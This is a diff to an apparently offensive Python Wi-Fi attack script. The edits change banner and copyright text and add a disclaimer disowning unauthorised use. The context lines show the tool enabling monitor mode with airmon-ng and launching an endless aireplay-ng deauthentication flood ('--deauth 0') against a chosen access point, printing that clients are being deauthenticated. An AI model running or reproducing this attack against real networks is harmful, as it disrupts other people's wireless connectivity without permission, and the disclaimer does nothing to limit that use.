@@ -28,11 +28,11 @@ print(r"""
 |_|  |_| \___||_| /____/ \___| |_| |_| |____/  \___||_|   \__, |
                                                            __/ |
                                                           |___/ """)
-print("\n****************************************************************")
-print("\n* Copyright of Bharathkrishna, 2026                            *")
-print("\n* https://github.com/BharathkrishnaH4X                         *")
-print("\n* Sudharshan and Kaviprabhu are Best Friends                   *")
-print("\n****************************************************************")
+print("\n************************************************************************")
+print("\n* Copyright of BharathkrishnaH4X, 2026                                 *")
+print("\n* https://github.com/BharathkrishnaH4X                                 *")
+print("\n* Author is not responsible for usage of tool on unauthorized Networks *")
+print("\n************************************************************************")
 
 if not 'SUDO_UID' in os.environ.keys():
     time.sleep(1)
@@ -122,7 +122,6 @@ hackchannel = active_wireless_networks[int(choice)]["channel"].strip()
 subprocess.run(["airmon-ng", "start", hacknic + "mon", hackchannel])
 
 subprocess.Popen(["aireplay-ng", "--deauth", "0", "-a", hackbssid, check_wifi_result[int(wifi_interface_choice)] + "mon"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) 
-
 try:
     while True:
         print("Deauthenticating clients from", hackbssid, "on channel", hackchannel)
